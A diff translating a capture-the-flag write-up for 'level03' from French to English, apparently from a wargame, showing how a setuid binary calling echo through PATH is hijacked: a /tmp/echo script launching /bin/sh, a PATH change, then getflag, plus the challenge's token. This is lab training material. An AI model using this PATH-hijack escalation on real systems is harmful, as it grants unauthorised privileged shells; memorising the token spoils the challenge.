@@ -1,51 +1,50 @@
 # level03
 
-1. Fichiers trouvés dans `~/` :
+1. Files found in `~/` :
 
-Fichier : `./level03` appartenant à `flag03`
+```bash
+./level03
+```
 
-2) Exécution du binaire trouvé :
+File : `./level03` belonging to `flag03`
+
+2. Binary analysis
 
 ```bash
 chmod +x level03
+./level03
 Exploit me
 ```
 
-3) Inspection du binaire avec strings et file :
+Binary inspection with strings and file :
 
 ```bash
 file level03
 strings -n 6 level03 | grep echo
 ```
-4) Résultats : 
 
-Le binaire utilise echo depuis son PATH dans l'environnement et possède les droits de son créateur (setuid / setgid).
+The binary uses echo from its PATH in the environment and has the rights of its creator (setuid / setgid).
+
 ```bash
 setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
 ```
+
 ```bash
 /usr/bin/env echo Exploit me
 ```
 
-5) Objectif :
+3. Exploitation
 
-Détourner echo vers une invite de commande afin de lancer `getflag`.
+Redirect echo to a command prompt in order to launch `getflag`.
 
 ```bash
 echo '/bin/sh' > /tmp/echo
 chmod +x /tmp/echo
-```
-Maintenant le script tmp/echo ouvre une invite de commande, et ensuite on change le PATH d'echo vers tmp/echo dans l'environnement.
-
-```bash
 export PATH=/tmp:$PATH
-```
-
-6) Nous voilà maintenant dans une invite de commande possédant les droits de flag03, il ne nous reste plus qu'à appeler getflag.
-
-```bash
+./level03
 getflag
 ```
-7) Token découvert :
 
-le token est `qi0maab88jeaj46qoumi7maus`
+4. Token discovered
+
+The token is : `qi0maab88jeaj46qoumi7maus`
